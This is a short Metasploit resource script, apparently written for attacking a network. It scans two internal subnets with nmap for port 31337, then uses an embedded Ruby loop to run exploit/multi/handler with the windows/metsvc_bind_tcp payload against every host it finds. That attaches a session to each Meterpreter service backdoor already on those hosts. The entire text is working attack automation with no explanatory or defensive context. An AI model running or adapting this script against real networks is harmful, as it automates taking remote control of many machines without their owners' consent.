#db_nmap -T5 -iL /root/Desktop/hosts -p 31337
db_nmap -T5 10.1.30.0/24 10.1.40.0/24 -p 31337 --open

<ruby>
#arrary for hosts
hosts = []

framework.db.services.each do |service|
  if service.port == 31337
    hosts << service.host.address
  end
end

self.run_single("use exploit/multi/handler")
puts("\nRunning Module exploit/multi/handler")
self.run_single("set PAYLOAD windows/metsvc_bind_tcp")
self.run_single("set LPORT 31337")

#for each host with 31337 set appropriate configs and run_single
hosts.each do |rhost|
  self.run_single("set RHOST #{rhost}")
  self.run_single("exploit -j")
end



</ruby>
